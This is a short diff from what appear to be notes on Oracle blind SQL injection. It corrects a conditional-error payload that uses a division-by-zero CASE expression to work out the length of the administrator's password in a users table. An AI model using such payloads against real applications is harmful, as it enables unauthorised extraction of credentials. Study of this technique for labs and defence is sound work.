@@ -18,4 +18,4 @@ In Oracle, subquery must return 1 row 1 column, so we must constrain `rownum = 1
 
 Utilize conditional errors : 
 
-`' || (select case when length(password) > num then to_char(1/0) else ' ' end form users where username = 'Adninistrator') || '`
+`' || (select case when length(password) > num then to_char(1/0) else ' ' end from users where username = 'adninistrator') || '`
